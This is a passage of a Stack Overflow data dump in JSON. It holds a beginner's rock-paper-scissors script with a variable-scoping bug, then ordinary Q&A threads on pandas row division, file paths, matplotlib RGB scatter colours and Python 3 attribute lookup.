random\nimport time\n\ndef main():\n    ### Declarations ###\n    items = []\n    userItems = []\n    machineItems = []\n    totalTies = 0\n    userWins = 0\n    cpuWins = 0\n\n    ### Adding elements ###\n    items.append(\"rock\")\n    items.append(\"paper\")\n    items.append(\"scissors\")\n\n    ### Function calls ###\n    replay(items, userItems, machineItems, totalTies, userWins, cpuWins)\n    os.system('cls')\n    printResults(userItems, machineItems, totalTies, userWins, cpuWins)\n\ndef replay(items, userItems, machineItems, totalTies, userWins, cpuWins):\n    response = 'yes'\n    while (response == 'yes'):\n        print(\"*Please enter only lower-cased words*\")\n\n        ### It was a tie! ###\n        ## This is also Input Validation for the below loop ##\n        print(\"Do you pick: \",\n              \"\\n\\t1. Rock?\",\n              \"\\n\\t2. Paper?\",\n              \"\\n\\t3. Scissors?\")\n        userChoice = input(\"Object: \")\n        machineChoice = random.choice(items)\n\n        if (userChoice == machineChoice):\n            print(\"Another game is to be played.\")\n            time.sleep(.5)\n            print(\"Seting up...\")\n            time.sleep(1)\n\n            os.system('cls')\n\n            print(\"Do you pick: \",\n                  \"\\n\\t1. Rock?\",\n                  \"\\n\\t2. Paper?\",\n                  \"\\n\\t3. Scissors?\")\n            userChoice = input(\"Object: \")\n            machineChoice = random.choice(items)\n\n            totalTies += 1\n            userItems.append(userChoice)\n            machineItems.append(machineChoice)\n\n            os.system('cls')\n\n            while (userChoice == machineChoice):\n                print(\"Another game is to be played.\")\n                time.sleep(.5)\n                print(\"Seting up...\")\n                time.sleep(1)\n\n                print(\"Do you pick: \",\n                      \"\\n\\t1. Rock?\",\n                      \"\\n\\t2. Paper?\",\n                      \"\\n\\t3. Scissors?\")\n                userChoice = input(\"Object: \")\n                machineChoice = random.choice(items)\n\n                totalTies += 1\n                userItems.append(userChoice)\n                machineItems.append(machineChoice)\n\n                os.system('cls')\n\n        ### User picked \"rock\" ###\n        elif(userChoice == \"rock\"):\n            if(machineChoice == \"paper\"):\n                print(\"You chose: \", userChoice)\n                time.sleep(.5)\n                print(\"The computer chose: \", machineChoice)\n                time.sleep(.5)\n                print(\"And the verdict is...\")\n                time.sleep(1.5)\n\n                print(\"Paper covers rock.\")\n                time.sleep(.5)\n                print(\"You lose.\")\n\n                cpuWins += 1\n                userItems.append(userChoice)\n                machineItems.append(machineChoice)\n                os.system('cls')\n\n            elif(machineChoice == \"scissors\"):\n                print(\"You chose: \", userChoice)\n                time.sleep(.5)\n                print(\"The computer chose: \", machineChoice)\n                time.sleep(.5)\n                print(\"And the verdict is...\")\n                time.sleep(1.5)\n\n                print(\"Rock crushes scissors.\")\n                time.sleep(.5)\n                print(\"You win!\")\n\n                userWins += 1\n                userItems.append(userChoice)\n                machineItems.append(machineChoice)\n                os.system('cls')\n\n        ### User picked \"paper\" ###\n        elif(userChoice == \"paper\"):\n            if(machineChoice == \"scissors\"):\n                print(\"You chose: \", userChoice)\n                time.sleep(.5)\n                print(\"The computer chose: \", machineChoice)\n                time.sleep(.5)\n                print(\"And the verdict is...\")\n                time.sleep(1.5)\n\n                print(\"Scissors cuts paper.\")\n                time.sleep(.5)\n                print(\"You lose.\")\n\n                cpuWins += 1\n                userItems.append(userChoice)\n                machineItems.append(machineChoice)\n                os.system('cls')\n\n            elif(machineChoice == \"rock\"):\n                print(\"You chose: \", userChoice)\n                time.sleep(.5)\n                print(\"The computer chose: \", machineChoice)\n                time.sleep(.5)\n                print(\"And the verdict is...\")\n                time.sleep(1.5)\n\n                print(\"Paper covers rock.\")\n                time.sleep(.5)\n                print(\"You win!\")\n\n                userWins += 1\n                userItems.append(userChoice)\n                machineItems.append(machineChoice)\n                os.system('cls')\n\n        ### User picked \"scissors\" ###\n        elif(userChoice == \"scissors\"):\n            if(machineChoice == \"rock\"):\n                print(\"You chose: \", userChoice)\n                time.sleep(.5)\n                print(\"The computer chose: \", machineChoice)\n                time.sleep(.5)\n                print(\"And the verdict is...\")\n                time.sleep(1.5)\n\n                print(\"Rock smashes scissors.\")\n                time.sleep(.5)\n                print(\"You lose.\")\n\n                cpuWins += 1\n                userItems.append(userChoice)\n                machineItems.append(machineChoice)\n                os.system('cls')\n\n            elif(machineChoice == \"paper\"):\n                print(\"You chose: \", userChoice)\n                time.sleep(.5)\n                print(\"The computer chose: \", machineChoice)\n                time.sleep(.5)\n                print(\"And the verdict is...\")\n                time.sleep(1.5)\n\n                print(\"Scissors cuts paper.\")\n                time.sleep(.5)\n                print(\"You win!\")\n\n                userWins += 1\n                userItems.append(userChoice)\n                machineItems.append(machineChoice)\n                os.system('cls')\n\n        response = input(\"Replay? ('yes' to continue) \")\n        os.system('cls')\n\ndef printResults(userItems, machineItems, totalTies, userWins, cpuWins):\n    print(\"You chose: \", \"\\n\")\n    for i in userItems:\n        print(\"\\t\", i)\n\n    print(\"The computer chose: \", \"\\n\")\n    for i in machineItems:\n        print(\"\\t\", i)\n\n    print(\"Total ties: \", totalTies)\n    print(\"User wins: \", userWins)\n    print(\"Computer wins: \", cpuWins)\n\n    gamesPlayed = (totalTies + userWins + cpuWins)\n    print(\"Games played: \", gamesPlayed)\n\n    input(\"Press [Enter] to continue...\")\n\nmain()\n</code></pre>\n\n<p>This is just supposed to be a Rock_Paper_Scissors program that restarts if there is a tie, records the <code>userWins</code>, <code>cpuWins</code>, and <code>totalTies</code>. When I run this, all works fine, except for the <code>userWins</code>, <code>cpuWins</code>, <code>totalTies</code> do not receive the updated values, so when I print out the results at the end of the program, to show the user how they did, it will say that <code>userWins</code>, <code>cpuWins</code>, <code>totalTies</code>, and <code>gamesPlayed</code> are all 0. I don't understand because the lists <code>userItems</code> and <code>machineItems</code>, used to show the user what was picked by each side, work but not the previously stated variables. Can someone please tell me what I am doing wrong? Thank you in advance!</p>\n"}, {"tags": ["python", "pandas"], "comments": [{"owner": {"reputation": 289239, "user_id": 704848, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f9be2c2958e208c8d9b629ac43c9c42?s=128&d=identicon&r=PG", "display_name": "EdChum", "link": "https://stackoverflow.com/users/704848/edchum"}, "edited": false, "score": 0, "creation_date": 1427917950, "post_id": 29399464, "comment_id": 46975007, "body": "Doesn&#39;t just <code>test.loc[test.index.year == 2009]&#47;test.loc[test.index.year == 2007]</code> work?"}, {"owner": {"reputation": 13322, "user_id": 1082349, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/ffbba800a06c2ba0908a2a1467841c73?s=128&d=identicon&r=PG", "display_name": "FooBar", "link": "https://stackoverflow.com/users/1082349/foobar"}, "reply_to_user": {"reputation": 289239, "user_id": 704848, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f9be2c2958e208c8d9b629ac43c9c42?s=128&d=identicon&r=PG", "display_name": "EdChum", "link": "https://stackoverflow.com/users/704848/edchum"}, "edited": false, "score": 0, "creation_date": 1427918046, "post_id": 29399464, "comment_id": 46975074, "body": "@EdChum: No, that gives me the same as <code>divide()</code>"}, {"owner": {"reputation": 23416, "user_id": 3877338, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/300539394aa55b738b51e6769cca9b3e?s=128&d=identicon&r=PG&f=1", "display_name": "JohnE", "link": "https://stackoverflow.com/users/3877338/johne"}, "edited": false, "score": 0, "creation_date": 1427918106, "post_id": 29399464, "comment_id": 46975110, "body": "<code>test.div(test.shift())</code> will definitely work for this but may or may not be convenient depending on what exactly you&#39;re trying to do."}, {"owner": {"reputation": 289239, "user_id": 704848, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f9be2c2958e208c8d9b629ac43c9c42?s=128&d=identicon&r=PG", "display_name": "EdChum", "link": "https://stackoverflow.com/users/704848/edchum"}, "edited": false, "score": 0, "creation_date": 1427918464, "post_id": 29399464, "comment_id": 46975295, "body": "This is a bug to me, your index is of dtype datetimeindex, when perform loc and trying to divide it produces NaN, if you did this then it would work <code>df.iloc[3]&#47;df.iloc[5]</code> and produce the correct result. So you can either reset the index and find the row with that value and perform the division or try to use the integer index value to select that row"}], "answers": [{"comments": [{"owner": {"reputation": 289239, "user_id": 704848, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f9be2c2958e208c8d9b629ac43c9c42?s=128&d=identicon&r=PG", "display_name": "EdChum", "link": "https://stackoverflow.com/users/704848/edchum"}, "edited": false, "score": 0, "creation_date": 1427918357, "post_id": 29399632, "comment_id": 46975255, "body": "The OP has already stated that they&#39;ve tried that and it works"}, {"owner": {"reputation": 23416, "user_id": 3877338, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/300539394aa55b738b51e6769cca9b3e?s=128&d=identicon&r=PG&f=1", "display_name": "JohnE", "link": "https://stackoverflow.com/users/3877338/johne"}, "reply_to_user": {"reputation": 289239, "user_id": 704848, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f9be2c2958e208c8d9b629ac43c9c42?s=128&d=identicon&r=PG", "display_name": "EdChum", "link": "https://stackoverflow.com/users/704848/edchum"}, "edited": false, "score": 0, "creation_date": 1427918538, "post_id": 29399632, "comment_id": 46975340, "body": "@EdChum  -- it&#39;s different, Alexander only used <code>values</code> on the second part whereas FooBar used on both.  Hence, Alexander&#39;s way keeps it as a Series/DataFrame.  He should have showed the output and it would have been more obvious."}, {"owner": {"reputation": 289239, "user_id": 704848, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f9be2c2958e208c8d9b629ac43c9c42?s=128&d=identicon&r=PG", "display_name": "EdChum", "link": "https://stackoverflow.com/users/704848/edchum"}, "edited": false, "score": 0, "creation_date": 1427918574, "post_id": 29399632, "comment_id": 46975364, "body": "Fair enough didn&#39;t spot that but I think this is a bug as it works if the dtype of the index is Int64 or if you use <code>iloc</code>"}], "tags": [], "owner": {"reputation": 86481, "user_id": 2411802, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/RA92x.jpg?s=128&g=1", "display_name": "Alexander", "link": "https://stackoverflow.com/users/2411802/alexander"}, "is_accepted": false, "score": 1, "last_activity_date": 1427919074, "last_edit_date": 1427919074, "creation_date": 1427918122, "answer_id": 29399632, "question_id": 29399464, "link": "https://stackoverflow.com/questions/29399464/pandas-divide-two-rows-by-each-other/29399632#29399632", "title": "Pandas: Divide two rows by each other", "body": "<p>Perhaps:</p>\n\n<pre><code>test = pd.DataFrame(np.random.randn(2,5), index=[pd.Timestamp('2007-01-01'), pd.Timestamp('2008-01-01')])\n\n&gt;&gt;&gt; test.loc[test.index.year == 2007].divide(test.loc[test.index.year == 2008].values)\n               0         1         2         3         4\n2007-01-01  0.496822 -1.198635  0.222452  0.688838  0.256559\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 289239, "user_id": 704848, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f9be2c2958e208c8d9b629ac43c9c42?s=128&d=identicon&r=PG", "display_name": "EdChum", "link": "https://stackoverflow.com/users/704848/edchum"}, "edited": false, "score": 0, "creation_date": 1427919370, "post_id": 29399818, "comment_id": 46975796, "body": "But in that example you are explicitly selecting multiple values, here we select single row values for the division, the naive assumption would be that this would perform a simple division, I guess it&#39;s unexpected but designed behaviour"}, {"owner": {"reputation": 44364, "user_id": 2487184, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/d8cd1dea84cfe8312c532088a0da08e8?s=128&d=identicon&r=PG", "display_name": "CT Zhu", "link": "https://stackoverflow.com/users/2487184/ct-zhu"}, "reply_to_user": {"reputation": 289239, "user_id": 704848, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f9be2c2958e208c8d9b629ac43c9c42?s=128&d=identicon&r=PG", "display_name": "EdChum", "link": "https://stackoverflow.com/users/704848/edchum"}, "edited": false, "score": 0, "creation_date": 1427919779, "post_id": 29399818, "comment_id": 46976014, "body": "My guess is, it is potentially possible that boolean indexing <i>may</i> return more than one row, instead of explicit index such as <code>df.iloc[3]&#47;df.iloc[5]</code>, which will <i>only</i> return single row. If this is the designers&#39; intention, I think it makes better sense to have two different behavior. But anyway, it is their call... The OP&#39;s approach may still be dangerous anyway, see edit."}, {"owner": {"reputation": 289239, "user_id": 704848, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3f9be2c2958e208c8d9b629ac43c9c42?s=128&d=identicon&r=PG", "display_name": "EdChum", "link": "https://stackoverflow.com/users/704848/edchum"}, "edited": false, "score": 0, "creation_date": 1427919951, "post_id": 29399818, "comment_id": 46976109, "body": "I&#39;ve +1 ed everyone&#39;s contribution to this, I think you are correct and it makes sense, it&#39;s one of those subtle things that doesn&#39;t tend to bite you when using unique int indexes and selecting rows using <code>loc</code>"}, {"owner": {"reputation": 914, "user_id": 10104231, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-WvoM862slBE/AAAAAAAAAAI/AAAAAAAAI0g/AZE5G-stAPY/photo.jpg?sz=128", "display_name": "Prakhar Jhudele", "link": "https://stackoverflow.com/users/10104231/prakhar-jhudele"}, "edited": false, "score": 0, "creation_date": 1590816248, "post_id": 29399818, "comment_id": 109829608, "body": "can you please have a look at my question [<a href=\"https://stackoverflow.com/questions/62083576/pandas-row-filters-and-and-division-from-specific-rows-and-columns]\" title=\"pandas row filters and and division from specific rows and columns%5d\">stackoverflow.com/questions/62083576/&hellip;</a>"}], "tags": [], "owner": {"reputation": 44364, "user_id": 2487184, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/d8cd1dea84cfe8312c532088a0da08e8?s=128&d=identicon&r=PG", "display_name": "CT Zhu", "link": "https://stackoverflow.com/users/2487184/ct-zhu"}, "is_accepted": true, "score": 5, "last_activity_date": 1427919973, "last_edit_date": 1427919973, "creation_date": 1427918815, "answer_id": 29399818, "question_id": 29399464, "link": "https://stackoverflow.com/questions/29399464/pandas-divide-two-rows-by-each-other/29399818#29399818", "title": "Pandas: Divide two rows by each other", "body": "<p>If you want to keep the index for 2007, I think you can just do:</p>\n\n<pre><code>df.loc[df.index.year == 2007]/df.loc[df.index.year == 2009].values\n</code></pre>\n\n<p>The reason why <code>df.loc[df.index.year == 2007]/df.loc[df.index.year == 2009]</code> or <code>df.loc[df.index.year == 2007].divide(df.loc[df.index.year == 2009])</code> are not working is that <code>pandas</code> tries to align the data by their index. In this case, what will happen is data for 2007 will be divided by data with index value of 2007 (same applies for 2009). That's why you are getting, 2, not just 1 row of <code>Nan</code>s.</p>\n\n<p>Therefore we need to cast one of them into they respective <code>np.array</code> in order to get this working. (<code>df.loc[df.index.year == 2007]/df.loc[df.index.year == 2009].values</code>). The index of the numerator, since it is untouched, is retained. </p>\n\n<p>@EdChum, I don't think it is a bug, I think it is the intended behavior for boolean indexing, considering this:</p>\n\n<pre><code>df.iloc[df.index.year&gt;=2007]/df.loc[df.index.year == 2007]\n             0   1   2   3   4   5   6  employment\ndate                                              \n2007-01-01   1   1   1   1   1   1   1           1\n2009-01-01 NaN NaN NaN NaN NaN NaN NaN         NaN\n</code></pre>\n\n<p>But you should be careful about this approach, because you may get more than one row from boolean indexing, see these two examples:</p>\n\n<pre><code>In [128]:\n\nprint df\n                     0           1           2           3           4  \\\n2007-12-31  252.855283  353.626100  556.295659  439.558188  432.936844   \n2008-12-31  269.277757  380.608002  401.765546  491.893821  433.864499   \n2009-12-31  269.277757  380.608002  401.765546  491.893821  433.864499   \n\n                     5           6          7  \n2007-12-31  439.437132  433.269903  64.116667  \n2008-12-31  492.396073  489.260588  69.137500  \n2009-12-31  492.396073  489.260588  69.137500  \nIn [130]:\n\nprint df.iloc[df.index.year==2007]/df.loc[df.index.year &gt;= 2007]\n#divide one row by 3 rows? Dimension mismatch? No, it will work just fine.\n             0   1   2   3   4   5   6   7\n2007-12-31   1   1   1   1   1   1   1   1\n2008-12-31 NaN NaN NaN NaN NaN NaN NaN NaN\n2009-12-31 NaN NaN NaN NaN NaN NaN NaN NaN\nIn [131]:\n\ndf.iloc[df.index.year==2007]/df.loc[df.index.year &gt;= 2007].values\n---------------------------------------------------------------------------\nValueError                                Traceback (most recent call last)\n**************\nValueError: Shape of passed values is (8, 3), indices imply (8, 1)\n#basically won't work due to dimension mismatch\n</code></pre>\n"}], "owner": {"reputation": 13322, "user_id": 1082349, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/ffbba800a06c2ba0908a2a1467841c73?s=128&d=identicon&r=PG", "display_name": "FooBar", "link": "https://stackoverflow.com/users/1082349/foobar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2592, "favorite_count": 0, "accepted_answer_id": 29399818, "answer_count": 2, "score": 3, "last_activity_date": 1427919973, "creation_date": 1427917555, "question_id": 29399464, "link": "https://stackoverflow.com/questions/29399464/pandas-divide-two-rows-by-each-other", "title": "Pandas: Divide two rows by each other", "body": "<p>Here are two rows from my data frame:</p>\n\n<pre><code>&gt;&gt;&gt; test.loc[test.index.year == 2009]\n                     0         1           2           3           4  \\\ndate                                                                   \n2009-01-01  252.855283  353.6261  556.295659  439.558188  432.936844   \n\n                     5           6  employment  \ndate                                            \n2009-01-01  439.437132  433.269903   64.116667 \n\n&gt;&gt;&gt; test.loc[test.index.year == 2007]\n                     0           1           2           3           4  \\\ndate                                                                     \n2007-01-01  269.277757  380.608002  401.765546  491.893821  433.864499   \n\n                     5           6  employment  \ndate                                            \n2007-01-01  492.396073  489.260588     69.1375  \n</code></pre>\n\n<p>When I tried <code>divide</code>, I got </p>\n\n<pre><code>&gt;&gt;&gt; test.loc[test.index.year == 2009].divide(test.loc[test.index.year == 2007])\n             0   1   2   3   4   5   6  employment\ndate                                              \n2007-01-01 NaN NaN NaN NaN NaN NaN NaN         NaN\n2009-01-01 NaN NaN NaN NaN NaN NaN NaN         NaN\n</code></pre>\n\n<p>Which comes from <code>pandas</code> trying to divide columns comparing the index. However, none of the options in <code>axis=</code> helped me. I could get the correct result doing</p>\n\n<pre><code>test.loc[test.index.year == 2009].values / test.loc[test.index.year == 2007].values\narray([[ 0.93901288,  0.92910842,  1.38462759,  0.8936038 ,  0.99786188,\n         0.89244646,  0.88556061,  0.92737902]])\n</code></pre>\n\n<p>Is there no better way of doing this? I would like to keep the index <code>2007-01-01</code> corresponding to the record - of course, I could reattach it to the values, but usually when I was trying to do these kind of things there was my way, and then there was the right way. So: What else could I do?</p>\n"}, {"tags": ["python", "file-io"], "comments": [{"owner": {"reputation": 13, "user_id": 3504505, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f42c6e369d6ea22a9498497b876aa396?s=128&d=identicon&r=PG&f=1", "display_name": "Mowblow", "link": "https://stackoverflow.com/users/3504505/mowblow"}, "edited": false, "score": 0, "creation_date": 1427917034, "post_id": 29399315, "comment_id": 46974499, "body": "The title is supposed to be &quot;How to change file path in python&quot;"}, {"owner": {"reputation": 18703, "user_id": 2912340, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/ddQ02.jpg?s=128&g=1", "display_name": "\u0141ukasz Rogalski", "link": "https://stackoverflow.com/users/2912340/%c5%81ukasz-rogalski"}, "edited": false, "score": 0, "creation_date": 1427917188, "post_id": 29399315, "comment_id": 46974583, "body": "Please precise your problem and define expected output for given input."}, {"owner": {"reputation": 69452, "user_id": 953482, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/T3HH6.png?s=128&g=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/953482/kevin"}, "edited": false, "score": 0, "creation_date": 1427917285, "post_id": 29399315, "comment_id": 46974626, "body": "Is this your actual code? <code>FILE.write(.join(GENPASS)+&quot;&#47;n&quot;)</code> doesn&#39;t look like valid syntax to me."}], "answers": [{"tags": [], "owner": {"reputation": 19646, "user_id": 494074, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/741e480d426fabd85825861bd6481ccd?s=128&d=identicon&r=PG", "display_name": "Ankur Agarwal", "link": "https://stackoverflow.com/users/494074/ankur-agarwal"}, "is_accepted": true, "score": 2, "last_activity_date": 1427917477, "creation_date": 1427917477, "answer_id": 29399442, "question_id": 29399315, "link": "https://stackoverflow.com/questions/29399315/how-to-change-file-path-in-python/29399442#29399442", "title": "How to change file path in python", "body": "<p>To change the path of <code>FILE</code> you will have to set it up in this declaration:</p>\n\n<p>e.g.</p>\n\n<pre><code>FILENAME = \"/mypath/Test.txt\"\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 3504505, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f42c6e369d6ea22a9498497b876aa396?s=128&d=identicon&r=PG&f=1", "display_name": "Mowblow", "link": "https://stackoverflow.com/users/3504505/mowblow"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1713, "favorite_count": 1, "accepted_answer_id": 29399442, "answer_count": 1, "score": -1, "last_activity_date": 1427917594, "creation_date": 1427916990, "last_edit_date": 1427917594, "question_id": 29399315, "link": "https://stackoverflow.com/questions/29399315/how-to-change-file-path-in-python", "title": "How to change file path in python", "body": "<p>How would I edit the path of a file I created with file.open in python? For example, with my code:</p>\n\n<pre><code>import sys\nimport os\nimport os.path\nGENPASS = [\"g\",\"q\"]\nFILENAME = \"Test.txt\"\nACC = \"Test\"\nFILE = open(FILENAME,'a')\nFILE.write(ACC)\nFILE.write(','.join(GENPASS)+\"/n\")\n</code></pre>\n\n<p>How would I change the path of \"FILE\"</p>\n"}, {"tags": ["python", "matplotlib", "scatter-plot"], "answers": [{"comments": [{"owner": {"reputation": 307, "user_id": 6199844, "user_type": "registered", "profile_image": "https://graph.facebook.com/756589081107808/picture?type=large", "display_name": "Carlos Diego", "link": "https://stackoverflow.com/users/6199844/carlos-diego"}, "edited": false, "score": 0, "creation_date": 1539610239, "post_id": 29399590, "comment_id": 92553131, "body": "and how would it apply in my case? <a href=\"https://stackoverflow.com/questions/52788407/how-to-plot-graphics-with-the-colors-of-each-pixel-in-the-image\" title=\"how to plot graphics with the colors of each pixel in the image\">stackoverflow.com/questions/52788407/&hellip;</a>"}], "tags": [], "owner": {"reputation": 237077, "user_id": 325565, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/342bd0a61c7081db529c856d3bcd9545?s=128&d=identicon&r=PG", "display_name": "Joe Kington", "link": "https://stackoverflow.com/users/325565/joe-kington"}, "is_accepted": true, "score": 12, "last_activity_date": 1427917955, "creation_date": 1427917955, "answer_id": 29399590, "question_id": 29399248, "link": "https://stackoverflow.com/questions/29399248/matplotlib-3d-scatterplot-with-marker-color-corresponding-to-rgb-values/29399590#29399590", "title": "matplotlib 3D scatterplot with marker color corresponding to RGB values", "body": "<p>Yes, you can do this, but it needs to be done through a separate mechanism than the <code>c</code> argument.  In a nutshell, use <code>facecolors=rgb_array</code>.</p>\n\n<hr>\n\n<p>First off, let me explain what's going on. The <code>Collection</code> that <code>scatter</code> returns has two \"systems\" (for lack of a better term) for setting colors.</p>\n\n<p>If you use the <code>c</code> argument, you're setting the colors through the <code>ScalarMappable</code> \"system\".  This specifies that the colors should be controlled by applying a colormap to a single variable.  (This is the <code>set_array</code> method of anything that inherits from <code>ScalarMappable</code>.)</p>\n\n<p>In addition to the <code>ScalarMappable</code> system, the colors of a collection can be set independently.  In that case, you'd use the <code>facecolors</code> kwarg.</p>\n\n<hr>\n\n<p>As a quick example, these points will have randomly specified rgb colors:</p>\n\n<pre><code>import matplotlib.pyplot as plt\nimport numpy as np\n\nx, y = np.random.random((2, 10))\nrgb = np.random.random((10, 3))\n\nfig, ax = plt.subplots()\nax.scatter(x, y, s=200, facecolors=rgb)\nplt.show()\n</code></pre>\n\n<p><img src=\"https://i.stack.imgur.com/PTY2v.png\" alt=\"enter image description here\"></p>\n"}], "owner": {"reputation": 1131, "user_id": 538706, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/6e94441f2a2c9c820d06037dd1bcc6d5?s=128&d=identicon&r=PG", "display_name": "Flux Capacitor", "link": "https://stackoverflow.com/users/538706/flux-capacitor"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7939, "favorite_count": 2, "accepted_answer_id": 29399590, "answer_count": 1, "score": 8, "last_activity_date": 1427917955, "creation_date": 1427916757, "last_edit_date": 1427917174, "question_id": 29399248, "link": "https://stackoverflow.com/questions/29399248/matplotlib-3d-scatterplot-with-marker-color-corresponding-to-rgb-values", "title": "matplotlib 3D scatterplot with marker color corresponding to RGB values", "body": "<p>I have loaded a picture into a numpy array using mahotas.</p>\n\n<pre><code>import mahotas\nimg = mahotas.imread('test.jpg')\n</code></pre>\n\n<p>Each pixel in <code>img</code> is represented by an array of RGB values:</p>\n\n<pre><code>img[1,1] = [254, 200, 189]\n</code></pre>\n\n<p>I have made a 3D scatterplot of R values on one axis, G values on the 2nd axis and B values on the third axis. This is no problem:</p>\n\n<pre><code>fig = plt.figure()\nax = fig.add_subplot(111, projection = '3d')\nfor i in range(1,img.shape[1]+1):\n    xs = img[i,1][0]\n    ys = img[i,1][1]\n    zs = img[i,1][2]\n    ax.scatter(xs, ys, zs, c='0.5', marker='o')\nax.set_xlabel('X Label')\nax.set_ylabel('Y Label')\nax.set_zlabel('Z Label')\n\nplt.show()\n</code></pre>\n\n<p>(I'm just plotting the first column of the image for the time being).</p>\n\n<p>How can I color each of the scatterplot dots by the color of each image pixel? i.e. I guess I would like to color the dots by their RGB value, but I'm not sure if this is possible?</p>\n"}, {"tags": ["python", "python-3.x"], "comments": [{"owner": {"reputation": 16571, "user_id": 2647279, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2598d68697fa2e519ee900ccfdffedd7?s=128&d=identicon&r=PG", "display_name": "Bas Swinckels", "link": "https://stackoverflow.com/users/2647279/bas-swinckels"}, "edited": false, "score": 1, "creation_date": 1427918908, "post_id": 29399161, "comment_id": 46975550, "body": "Possibly duplicate of <a href=\"http://stackoverflow.com/questions/20430637/python-3-getattr-behaving-differently-than-in-python-2\">this question</a>, which suggest that since you did not inherit from object, you were creating an old-style class under Python2. Quick test with <code>class DB(object):</code> under Python2 shows a similar error ..."}, {"owner": {"reputation": 68674, "user_id": 41316, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e2c31ca37c09ab42763f690e0d1355d7?s=128&d=identicon&r=PG", "display_name": "bruno desthuilliers", "link": "https://stackoverflow.com/users/41316/bruno-desthuilliers"}, "reply_to_user": {"reputation": 16571, "user_id": 2647279, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2598d68697fa2e519ee900ccfdffedd7?s=128&d=identicon&r=PG", "display_name": "Bas Swinckels", "link": "https://stackoverflow.com/users/2647279/bas-swinckels"}, "edited": false, "score": 0, "creation_date": 1427919777, "post_id": 29399161, "comment_id": 46976010, "body": "@BasSwinckels: the OP tagged the question as Python 3.x, which doesn&#39;t have old-style classes."}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 68674, "user_id": 41316, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e2c31ca37c09ab42763f690e0d1355d7?s=128&d=identicon&r=PG", "display_name": "bruno desthuilliers", "link": "https://stackoverflow.com/users/41316/bruno-desthuilliers"}, "edited": false, "score": 0, "creation_date": 1427919931, "post_id": 29399161, "comment_id": 46976098, "body": "@brunodesthuilliers, adding object will break the code in the same way in python2"}, {"owner": {"reputation": 16571, "user_id": 2647279, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2598d68697fa2e519ee900ccfdffedd7?s=128&d=identicon&r=PG", "display_name": "Bas Swinckels", "link": "https://stackoverflow.com/users/2647279/bas-swinckels"}, "reply_to_user": {"reputation": 68674, "user_id": 41316, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e2c31ca37c09ab42763f690e0d1355d7?s=128&d=identicon&r=PG", "display_name": "bruno desthuilliers", "link": "https://stackoverflow.com/users/41316/bruno-desthuilliers"}, "edited": false, "score": 0, "creation_date": 1427920273, "post_id": 29399161, "comment_id": 46976283, "body": "@brunodesthuilliers I know, but the fact that Python2 does have them explains why his old code broke."}, {"owner": {"reputation": 68674, "user_id": 41316, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e2c31ca37c09ab42763f690e0d1355d7?s=128&d=identicon&r=PG", "display_name": "bruno desthuilliers", "link": "https://stackoverflow.com/users/41316/bruno-desthuilliers"}, "reply_to_user": {"reputation": 16571, "user_id": 2647279, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2598d68697fa2e519ee900ccfdffedd7?s=128&d=identicon&r=PG", "display_name": "Bas Swinckels", "link": "https://stackoverflow.com/users/2647279/bas-swinckels"}, "edited": false, "score": 0, "creation_date": 1427920546, "post_id": 29399161, "comment_id": 46976415, "body": "@BasSwinckels &amp;&amp; Padraic: yes sorry, missed part of the point."}], "answers": [{"comments": [{"owner": {"reputation": 185, "user_id": 2100826, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b2ca439723447a5140db679c94b6eeae?s=128&d=identicon&r=PG", "display_name": "user2100826", "link": "https://stackoverflow.com/users/2100826/user2100826"}, "edited": false, "score": 0, "creation_date": 1427920302, "post_id": 29400014, "comment_id": 46976291, "body": "So it looks like what you&#39;re saying is that because <code>__getattribute__</code> raises an AttributeError, that error means Python no longer looks for whether <code>__dict__</code> exists, and so it goes straight to <code>__getattr__</code>? (And, FWIW, how can I <i>really</i> understand what I&#39;m doing unless I override <code>__getattribute__</code> once in a while? Thanks for the tips, tho.)"}, {"owner": 